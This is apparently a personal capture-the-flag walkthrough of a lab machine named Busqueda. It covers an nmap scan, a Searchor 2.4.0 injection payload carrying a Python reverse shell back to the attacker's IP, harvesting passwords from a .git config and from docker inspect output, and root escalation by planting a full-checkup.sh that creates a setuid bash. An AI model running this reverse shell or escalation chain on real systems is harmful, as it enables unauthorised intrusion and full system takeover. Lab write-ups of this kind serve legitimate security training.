`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.12.202`

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


We see the server is Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)

Searchor 2.4.0 is outdated and has arbitrary [code execution](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-?tab=readme-ov-file)

```
`, exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.116',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```


', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.15.116',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

python one liner  python3 -c 'import pty; pty.spawn("/bin/bash")'
Inputting this command in the querey filter gives us access as svc. Time to escalate perms 
```
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 .
drwxr-xr-x 4 root     root     4096 Apr  4  2023 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Dec 22 18:26 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates

```

```
svc@busqueda:/var/www/app/.git$ ls -la
ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 Dec 22 18:26 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
-rw-r--r-- 1 root     root      259 Apr  3  2023 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
```

we find creds in .git - config file 
```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We retry this password for sudo -l and find a command we can run as root :sob: so happy. 
`svc@busqueda:/var/www/app$ sudo -l
 
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *`

Note! The password is re-used in gitea for admin and lets us do some source code analysis on `system-checkup.py`

```
#!/bin/bash

import subprocess

import sys

  

actions = ['full-checkup', 'docker-ps','docker-inspect']

  

def run_command(arg_list):

r = subprocess.run(arg_list, capture_output=True)

if r.stderr:

output = r.stderr.decode()

else:

output = r.stdout.decode()

  

return output

  
  

def process_action(action):

if action == 'docker-inspect':

try:

_format = sys.argv[2]

if len(_format) == 0:

print(f"Format can't be empty")

exit(1)

container = sys.argv[3]

arg_list = ['docker', 'inspect', '--format', _format, container]

print(run_command(arg_list))

except IndexError:

print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")

exit(1)

except Exception as e:

print('Something went wrong')

exit(1)

elif action == 'docker-ps':

try:

arg_list = ['docker', 'ps']

print(run_command(arg_list))

except:

print('Something went wrong')

exit(1)

  

elif action == 'full-checkup':

try:

arg_list = ['./full-checkup.sh']

print(run_command(arg_list))

print('[+] Done!')

except:

print('Something went wrong')

exit(1)

  

if __name__ == '__main__':

  

try:

action = sys.argv[1]

if action in actions:

process_action(action)

else:

raise IndexError

  

except IndexError:

print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')

print('')

print(' docker-ps : List running docker containers')

print(' docker-inspect : Inpect a certain docker container')

print(' full-checkup : Run a full system checkup')

print('')

exit(1)
```

The thing we were **Supposed** to find in this script is that ./full-checkup.sh does not run via a subproccess it just runs via ./full-checkup.sh. This means if that file is not in the current diectory it wont run. It also means that if we are in a directory we can write in, we can get this line to run whatever we want

Using this script we can see it has three functions 
```
sudo python3 /opt/scripts/system-checkup.py test 
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2) 
docker-ps : List running docker containers 
docker-inspect : Inpect a certain docker container 
full-checkup : Run a full system checkup
```

Docker inspect and Docker-ps both work, These are legit docker commands 
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
<checkup.py docker-inspect '{{json .}}' gitea | jq .

```
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],

```


But since we know we can run whatever we want via having an executable `./full-checkup.sh` in our directory we can get root! 

I had to look at the write up from 0xdf to get this far and he provided a novel way to get root with arbitrary rce like this rather than a revshell

```
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-checkup.sh
```
Then we can execute that bash shell with full perms using... >> 

```
/tmp/0xdf -p
```


